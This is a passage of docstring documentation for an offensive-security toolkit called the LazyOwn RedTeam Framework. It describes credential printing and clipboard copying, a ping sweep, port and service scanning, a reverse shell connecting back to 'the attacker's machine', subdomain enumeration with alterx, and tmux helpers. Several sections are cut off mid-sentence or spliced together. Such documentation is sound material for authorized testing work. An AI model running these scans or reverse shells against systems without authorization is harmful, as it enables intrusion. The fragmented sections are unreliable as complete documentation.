instructing the user to create the credentials file first. The function extracts the username and password from the file,
prints them, and copies the password to the clipboard using `xclip`.

:param line: A string parameter that is not used in this function. It is included for compatibility with command-line
            interface functions.

:returns: None

Manual execution:
To manually perform the equivalent actions, follow these steps:

    1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
    2. Read the file and extract the username and password.
    3. Print the username and password to the console.
    4. Use the `xclip` tool to copy the password to the clipboard. Example command:

        echo '<password>' | xclip -sel clip

Example:
If `sessions/credentials.txt` contains `admin:password123`, the function will print:

    User : admin
    Pass : password123

The password `password123` will be copied to the clipboard.

Note:
Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
and correctly configured.

## hostdiscover
Discover active hosts in a subnet by performing a ping sweep.

This method constructs and executes a bash script that performs a
ping sweep on the specified subnet to identify active hosts. The
subnet is determined from the 'rhost' parameter. For each host in
the subnet, a ping request is sent, and active hosts are reported.

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:
- Extracts the first three octets of the 'rhost' parameter to form
the base IP pattern.

(from .1 to .254) and reports active hosts.
- The generated bash script is displayed to the user.
- Prompts the user to confirm whether they want to execute the
generated command.
- If the user confirms, executes the command using `self.cmd()`.
- If the user declines, copies the command to the clipboard using
`copy2clip()`.

Side Effects:
- Executes system commands and may affect the system environment.
- May modify the clipboard content if the user chooses not to execute.

Notes:
- Ensure that the 'rhost' parameter is a valid IP address and that
the `check_rhost()` function is implemented to validate the IP.
- `print_msg()` is used to display the constructed command to the
user.
- `copy2clip()` is used to copy the command to the clipboard if
not executed.

Example:
>>> do_hostdiscover("example_input")

## portdiscover

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:

user.
- `copy2clip()` is used to copy the command to the clipboard if
not executed.

Example:
>>> do_portdiscover("example_input")

## portservicediscover
Scan all ports on a specified host to identify open ports and associated services.

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:
- Extracts the 'rhost' parameter to determine the target IP address.
- Constructs a bash script to scan all ports on the target IP address
and report open ports along with any associated services.
- The generated bash script is displayed to the user.
- Prompts the user to confirm whether they want to execute the
generated command.
- If the user confirms, executes the command using `self.cmd()`.
- If the user declines, copies the command to the clipboard using
`copy2clip()`.

Side Effects:
- Executes system commands and may affect the system environment.
- Requires `sudo` privileges to use `lsof` for identifying services.

the attacker's machine.

Parameters:
- lport: Local port for the reverse shell connection, retrieved from self.params.
- lhost: Local host for the reverse shell connection, retrieved from self.params.

The function first validates the local host (lhost) and local port (lport) using
check_lhost() and check_lport(). If either validation fails, the function returns

1. **Check if 'alterx' is installed:**
- Uses `is_binary_present("alterx")` to verify if the 'alterx' binary is available in the system.
- If the binary is not found, the function prints a warning and proceeds to download and install 'alterx'.

2. **Installation of 'alterx':**
- Executes a system command to create a directory named 'alterx' in the user's home directory.
- Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.

3. **Add 'alterx' to system PATH:**
- Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH
    by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx'
    can be executed from any directory.

4. **Obtain the domain:**
- Retrieves the URL from the class parameter `self.params["url"]`.
- Extracts the domain from the URL using `get_domain(url)`.
- If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to
    the previously extracted domain.

5. **Execute 'alterx' on the domain:**
- Executes the 'alterx' tool on the specified domain via a system command.
- The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename
    `subdomain_dic_<domain>.txt`.

Parameters:
- line (str): The domain on which to run 'alterx'. If empty, the function prompts the user for input.

Returns:
- None: The function performs its operations but does not return any value.

Dependencies:
- The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()`
and `get_domain()` helper functions.

## h
Open a new window within a tmux session using the LazyOwn RedTeam Framework.

This method is designed to create a new horizontal split window in an existing
tmux session, where the specified command will be executed. The command
used to open the new window is the `./run --no-banner` script, which is
intended for use within the LazyOwn RedTeam Framework environment.

the `ensure_tmux_session` function. If the session is not already running,
it will create a new one. After confirming that the session is active, it
proceeds to create a new horizontal window with a specified size. The size of
the new window is currently set to 50% of the available terminal space.

Args:
    arg (str): Additional arguments passed to the command, if any. This can be
                used to customize the behavior of the command executed in the
                new window. However, in the current implementation, this
                argument is not utilized and can be left as an empty string.

Example:
    If this method is called within a command-line interface of the LazyOwn
    RedTeam Framework, it will open a new horizontal tmux window and execute
    the `./run --no-banner` command within it.

Note:
    - Ensure that tmux is installed and properly configured on the system.
    - The method assumes that the session name is defined and accessible in
    the scope where this method is called.

## v
Open a new window within a tmux session using the LazyOwn RedTeam Framework.

This method is designed to create a new vertical split window in an existing
tmux session, where the specified command will be executed. The command
used to open the new window is the `./run --no-banner` script, which is

The method first ensures that the specified tmux session is active by calling
the `ensure_tmux_session` function. If the session is not already running,
it will create a new one. After confirming that the session is active, it
proceeds to create a new vertical window with a specified size. The size of
the new window is currently set to 50% of the available terminal space.

Args:
    arg (str): Additional arguments passed to the command, if any. This can be
                used to customize the behavior of the command executed in the
                new window. However, in the current implementation, this
                argument is not utilized and can be left as an empty string.

Example:
    If this method is called within a command-line interface of the LazyOwn
    RedTeam Framework, it will open a new vertical tmux window and execute
    the `./run --no-banner` command within it.

Note:
    - Ensure that tmux is installed and properly configured on the system.
    - The method assumes that the session name is defined and accessible in
    the scope where this method is called.
